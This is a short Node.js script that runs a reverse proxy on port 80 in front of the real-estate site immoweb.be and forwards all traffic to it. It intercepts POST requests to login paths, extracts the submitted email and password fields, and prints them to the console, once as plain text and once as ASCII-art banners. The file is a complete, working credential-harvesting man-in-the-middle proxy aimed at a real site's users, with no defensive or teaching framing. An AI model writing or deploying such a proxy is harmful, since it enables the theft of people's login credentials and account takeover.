var http = require('http');
var connect = require('connect');
var httpProxy = require('http-proxy');
var figlet = require('figlet');
var querystring = require('querystring');

//
// Basic Connect App
//
var app = connect();

var proxy = httpProxy.createProxyServer({
   target: 'http://www.immoweb.be/',
   agent  : http.globalAgent,
   headers: { host: 'www.immoweb.be' },
})

app.use(
  function (req, res) {
    console.log("originalUrl", req.originalUrl)
    if(req.method.trim().toUpperCase() === 'POST' && req.originalUrl.match(/^\/.+\/login/)) {
      var body = ""
      req.on('data', function(chunk) {
        body += chunk
      })
      req.on('end', function() {
        var decoded = querystring.parse(body)
        console.log("Email : ", decoded.xContactEmail)
        console.log("Password : ", decoded.xPassword)
        if(!decoded.xContactEmail) {
          return ;
        }
        figlet(decoded.xContactEmail, function(err, data) {
          console.log(data)
        })
        figlet(decoded.xPassword, function(err, data) {
          console.log(data)
        })
      })
    }
    proxy.web(req, res);
  }
);

http.createServer(app).listen(80);
